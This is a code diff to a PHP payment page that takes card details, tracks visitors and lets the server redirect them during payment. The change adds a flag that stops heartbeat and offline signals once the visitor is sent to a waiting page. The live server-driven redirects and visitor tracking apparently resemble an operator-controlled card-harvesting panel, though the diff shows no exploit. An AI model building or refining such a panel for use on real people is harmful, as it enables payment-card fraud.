@@ -133,6 +133,7 @@ const studentId = <?= (int)$student['id'] ?>;
 const visitorId = <?= $visitorId ?>;
 let pageVisible = true;
 let paymentStatus = 'viewing';
+let navigatingAway = false;
 
 // ====== Card brand detection — comprehensive ======
 const CARD_BRANDS = [
@@ -351,6 +352,7 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
             alertEl.className = 'alert alert-success';
             alertEl.textContent = 'Payment details submitted! Redirecting...';
             paymentStatus = 'submitted';
+            navigatingAway = true;
             btn.textContent = 'Submitted';
             setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
         } else {
@@ -367,8 +369,8 @@ document.getElementById('payForm').addEventListener('submit', async function(e) 
 
 // ====== Heartbeat ======
 function hb() {
-    if (!pageVisible || document.hidden) return;
-    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});
+    if (!pageVisible || document.hidden || navigatingAway) return;
+    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).then(r=>r.json()).then(d=>{if(d.redirect && !navigatingAway)window.location.href=d.redirect}).catch(()=>{});
     if (visitorId) fetch('api/visitor-heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({visitor_id:visitorId, status:'payment'}) }).catch(()=>{});
 }
 document.addEventListener('visibilitychange', () => {
@@ -383,6 +385,7 @@ document.addEventListener('visibilitychange', () => {
     }
 });
 function sendOffline() {
+    if (navigatingAway) return;
     navigator.sendBeacon('api/offline.php', JSON.stringify({student_id:studentId}));
     if (visitorId) navigator.sendBeacon('api/visitor-offline.php', JSON.stringify({visitor_id:visitorId}));
 }
